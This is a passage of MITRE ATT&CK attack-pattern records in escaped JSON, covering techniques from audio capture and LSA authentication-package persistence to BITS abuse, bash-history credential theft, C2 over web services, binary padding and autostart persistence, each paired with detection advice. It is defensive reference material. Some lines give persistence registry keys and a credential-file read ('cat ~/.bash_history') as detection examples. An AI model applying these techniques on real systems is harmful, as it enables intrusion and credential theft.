7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\\n\\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\\n\\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_remote_support\":true,\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:34.528Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary can leverage a computer\'s peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\\n\\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.\",\"external_references\":[{\"external_id\":\"T1123\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1123\"},{\"external_id\":\"CAPEC-634\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/634.html\"}],\"id\":\"attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2019-06-18T13:16:53.385Z\",\"name\":\"Audio Capture\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\\n\\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.\",\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:43.135Z\",\"external_references\":[{\"external_id\":\"T1131\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1131\"},{\"description\":\"Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.\",\"source_name\":\"MSDN Authentication Packages\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx\"},{\"description\":\"Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.\",\"source_name\":\"Graeber 2014\",\"url\":\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\"},{\"description\":\"Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.\",\"source_name\":\"Microsoft Configure LSA\",\"url\":\"https://technet.microsoft.com/en-us/library/dn408187.aspx\"}],\"id\":\"attack-pattern--52d40641-c480-4ad5-81a3-c80ccaddf82d\",\"modified\":\"2020-01-24T15:43:25.280Z\",\"name\":\"Authentication Package\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T14:54:42.757Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)\\n\\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\</code> with the key value of <code>\\\"Authentication Packages\\\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.\",\"external_references\":[{\"external_id\":\"T1547.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/002\"},{\"description\":\"Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.\",\"source_name\":\"MSDN Authentication Packages\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx\"},{\"description\":\"Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.\",\"source_name\":\"Graeber 2014\",\"url\":\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\"},{\"description\":\"Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.\",\"source_name\":\"Microsoft Configure LSA\",\"url\":\"https://technet.microsoft.com/en-us/library/dn408187.aspx\"}],\"id\":\"attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T15:11:25.821Z\",\"name\":\"Authentication Package\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"DLL monitoring\",\"Windows Registry\",\"Loaded DLLs\"],\"x_mitre_detection\":\"Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key <code>HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:27.985Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \\n\\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files.\",\"external_references\":[{\"external_id\":\"T1119\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1119\"}],\"id\":\"attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-31T22:18:43.019Z\",\"name\":\"Automated Collection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Data loss prevention\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Permissions to access directories and files that store information of interest.\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:29.458Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \\n\\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).\",\"external_references\":[{\"external_id\":\"T1020\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1020\"}],\"id\":\"attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-11T13:58:08.219Z\",\"name\":\"Automated Exfiltration\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process use of network\"],\"x_mitre_detection\":\"Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\\n\\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001)  (Citation: Microsoft BITS) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)\\n\\nAdversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)\\n\\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). (Citation: CTU BITS Malware June 2016)\",\"external_references\":[{\"external_id\":\"T1197\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1197\"},{\"description\":\"Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.\",\"source_name\":\"Microsoft COM\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx\"},{\"description\":\"Microsoft. (n.d.). Background Intelligent Transfer Service. Retrieved January 12, 2018.\",\"source_name\":\"Microsoft BITS\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\"},{\"description\":\"Microsoft. (n.d.). BITSAdmin Tool. Retrieved January 12, 2018.\",\"source_name\":\"Microsoft BITSAdmin\",\"url\":\"https://msdn.microsoft.com/library/aa362813.aspx\"},{\"description\":\"Counter Threat Unit Research Team. (2016, June 6). Malware Lingers with BITS. Retrieved January 12, 2018.\",\"source_name\":\"CTU BITS Malware June 2016\",\"url\":\"https://www.secureworks.com/blog/malware-lingers-with-bits\"},{\"description\":\"Mondok, M. (2007, May 11). Malware piggybacks on Windows’ Background Intelligent Transfer Service. Retrieved January 12, 2018.\",\"source_name\":\"Mondok Windows PiggyBack BITS May 2007\",\"url\":\"https://arstechnica.com/information-technology/2007/05/malware-piggybacks-on-windows-background-intelligent-transfer-service/\"},{\"description\":\"Florio, E. (2007, May 9). Malware Update with Windows Update. Retrieved January 12, 2018.\",\"source_name\":\"Symantec BITS May 2007\",\"url\":\"https://www.symantec.com/connect/blogs/malware-update-windows-update\"},{\"description\":\"Hayashi, K. (2017, November 28). UBoatRAT Navigates East Asia. Retrieved January 12, 2018.\",\"source_name\":\"PaloAlto UBoatRAT Nov 2017\",\"url\":\"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/\"},{\"description\":\"Microsoft. (2011, July 19). Issues with BITS. Retrieved January 12, 2018.\",\"source_name\":\"Microsoft Issues with BITS July 2011\",\"url\":\"https://technet.microsoft.com/library/dd939934.aspx\"}],\"id\":\"attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-25T23:28:10.049Z\",\"name\":\"BITS Jobs\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ricardo Dias\",\"Red Canary\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\",\"Packet capture\",\"Windows event logs\"],\"x_mitre_defense_bypassed\":[\"Firewall\",\"Host forensic analysis\"],\"x_mitre_detection\":\"BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>). (Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>). (Citation: Microsoft BITS)\\n\\nMonitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the ‘Transfer’, \'Create\', \'AddFile\', \'SetNotifyFlags\', \'SetNotifyCmdLine\', \'SetMinRetryDelay\', \'SetCustomHeaders\', and \'Resume\' command options)  (Citation: Microsoft BITS)Admin and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database. (Citation: CTU BITS Malware June 2016)\\n\\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account). (Citation: Microsoft BITS)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1139\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1139\"},{\"description\":\"Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.\",\"source_name\":\"External to DA, the OS X Way\",\"url\":\"http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way\"}],\"id\":\"attack-pattern--44dca04b-808d-46ca-b25f-d85236d4b9f8\",\"modified\":\"2020-02-04T13:03:03.354Z\",\"name\":\"Bash History\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-04T13:02:11.685Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \\\"history\\\" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)\",\"external_references\":[{\"external_id\":\"T1552.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1552/003\"},{\"description\":\"Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.\",\"source_name\":\"External to DA, the OS X Way\",\"url\":\"http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way\"}],\"id\":\"attack-pattern--8187bd2a-866f-4457-9009-86b0ddedffa3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-02-07T20:48:49.878Z\",\"name\":\"Bash History\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitoring when the user\'s <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \\\"history\\\" instead of commands like <code>cat ~/.bash_history</code>.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-14T22:34:03.024Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \\n\\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. \",\"external_references\":[{\"external_id\":\"T1102.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1102/002\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-26T23:15:47.861Z\",\"name\":\"Bidirectional Communication\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Host network interface\",\"Netflow/Enclave netflow\",\"Network protocol analysis\",\"Packet capture\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:22.096Z\",\"external_references\":[{\"external_id\":\"T1009\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1009\"},{\"external_id\":\"CAPEC-572\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/572.html\"},{\"description\":\"Foltýn, T. (2018, March 13). OceanLotus ships new backdoor using old tricks. Retrieved May 22, 2018.\",\"source_name\":\"ESET OceanLotus\",\"url\":\"https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/\"},{\"description\":\"Ishimaru, S.. (2017, April 13). Old Malware Tricks To Bypass Detection in the Age of Big Data. Retrieved May 30, 2019.\",\"source_name\":\"Securelist Malware Tricks April 2017\",\"url\":\"https://securelist.com/old-malware-tricks-to-bypass-detection-in-the-age-of-big-data/78010/\"},{\"description\":\"VirusTotal. (n.d.). VirusTotal FAQ. Retrieved May 23, 2019.\",\"source_name\":\"VirusTotal FAQ\",\"url\":\"https://www.virustotal.com/en/faq/ \"}],\"id\":\"attack-pattern--519630c5-f03f-4882-825c-3af924935817\",\"modified\":\"2020-02-05T15:08:05.575Z\",\"name\":\"Binary Padding\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-05T14:04:25.865Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \\n\\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) \",\"external_references\":[{\"external_id\":\"T1027.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1027/001\"},{\"external_id\":\"CAPEC-572\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/572.html\"},{\"description\":\"Foltýn, T. (2018, March 13). OceanLotus ships new backdoor using old tricks. Retrieved May 22, 2018.\",\"source_name\":\"ESET OceanLotus\",\"url\":\"https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/\"},{\"description\":\"Ishimaru, S.. (2017, April 13). Old Malware Tricks To Bypass Detection in the Age of Big Data. Retrieved May 30, 2019.\",\"source_name\":\"Securelist Malware Tricks April 2017\",\"url\":\"https://securelist.com/old-malware-tricks-to-bypass-detection-in-the-age-of-big-data/78010/\"},{\"description\":\"VirusTotal. (n.d.). VirusTotal FAQ. Retrieved May 23, 2019.\",\"source_name\":\"VirusTotal FAQ\",\"url\":\"https://www.virustotal.com/en/faq/ \"}],\"id\":\"attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T20:50:48.023Z\",\"name\":\"Binary Padding\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Martin Jirkal, ESET\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Binary file metadata\",\"File monitoring\",\"Malware reverse engineering\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Signature-based detection\"],\"x_mitre_detection\":\"Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-23T17:46:59.535Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming)\u{a0} These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\\n\\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.\",\"external_references\":[{\"external_id\":\"T1547\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547\"},{\"description\":\"Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.\",\"source_name\":\"Microsoft Run Key\",\"url\":\"http://msdn.microsoft.com/en-us/library/aa376977\"},{\"description\":\"Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.\",\"source_name\":\"MSDN Authentication Packages\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx\"},{\"description\":\"Microsoft. (n.d.). Time Provider. Retrieved March 26, 2018.\",\"source_name\":\"Microsoft TimeProvider\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\"},{\"description\":\"Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.\",\"source_name\":\"Cylance Reg Persistence Sept 2013\",\"url\":\"https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\"},{\"description\":\"Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel Module Programming Guide. Retrieved April 6, 2018.\",\"source_name\":\"Linux Kernel Programming\",\"url\":\"https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-30T21:23:15.683Z\",\"name\":\"Boot or Logon Autostart Execution\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_detection\":\"Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.(Citation: TechNet Autoruns)  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. \\n\\nSuspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\\n\\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.\\n\\nMonitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"root\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:38.910Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \\n\\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \\n\\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.\",\"external_references\":[{\"external_id\":\"T1037\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1037\"},{\"external_id\":\"CAPEC-564\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/564.html\"}],\"id\":\"attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-27T16:49:15.953Z\",\"name\":\"Boot or Logon Initialization Scripts\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"macOS\",\"Windows\"],\"x_mitre_version\":\"2.0\"}",
